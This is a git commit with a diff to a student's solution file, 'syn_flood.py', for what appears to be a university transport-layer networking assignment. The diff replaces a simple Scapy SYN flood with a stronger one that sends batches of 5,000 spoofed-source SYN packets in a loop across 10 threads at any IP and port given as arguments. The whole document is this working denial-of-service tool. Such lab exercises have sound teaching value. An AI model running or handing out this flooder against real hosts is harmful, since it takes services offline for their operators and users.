e8e9e3fc7a70bfd95343fe25d941824ff3ce9f81
Henri Vanhuynegem <H.vanhuynegem@student.tudelft.nl>
2025-05-22 20:15:50 +0200

    changed syn flooodddddd

--- assignment-4-transport-layer/syn_flood/solution/syn_flood.py
+++ assignment-4-transport-layer/syn_flood/solution/syn_flood.py
@@ -1,17 +1,41 @@
+# from scapy.all import *
+# from threading import Thread
+# from sys import argv
+
+
+# def syn_flood(dst_ip, dst_port):
+#     for i in range(254):
+#         src_ip = f"192.168.124.{i}"
+#         # print(f"Sending SYN packet from {src_ip}:{i} to {dst_ip}:{dst_port}")
+#         if src_ip != dst_ip:
+#             pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=i, dport=dst_port, flags="S")
+#             send(pkt, verbose=0)
+
+# if __name__ == "__main__":
+#     if len(sys.argv) != 3:
+#         print("Usage: python3 syn_flood.py <ip> <port>")
+#         sys.exit(1)
+
+#     dst_ip = argv[1]
+#     dst_port = int(argv[2])
+
+#     while True:
+#         syn_flood(dst_ip, dst_port)
+
 from scapy.all import *
 from threading import Thread
 from sys import argv
 
 
-def syn_flood(dst_ip, dst_port):
-    for i in range(254):
-        src_ip = f"192.168.124.{i}"
-        # print(f"Sending SYN packet from {src_ip}:{i} to {dst_ip}:{dst_port}")
-        if src_ip != dst_ip:
-            pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=i, dport=dst_port, flags="S")
-            send(pkt, verbose=0)
+def syn_flood(dst_ip, dst_port, batch=5000):
+    pkts = [IP(dst=dst_ip, src=RandIP()) /
+            TCP(dport=dst_port, sport=RandShort(),
+                flags="S", seq=RandInt())
+            for _ in range(batch)]
 
-if __name__ == "__main__":
+    send(pkts, inter=0, loop=1, verbose=False)
+
+def main():
     if len(sys.argv) != 3:
         print("Usage: python3 syn_flood.py <ip> <port>")
         sys.exit(1)
@@ -19,5 +43,18 @@ if __name__ == "__main__":
     dst_ip = argv[1]
     dst_port = int(argv[2])
 
-    while True:
-        syn_flood(dst_ip, dst_port)
+    for _ in range(10):
+        t = Thread(target=syn_flood, args=(dst_ip, dst_port))
+        t.daemon = True
+        t.start()
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nStopping SYN flood...")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+
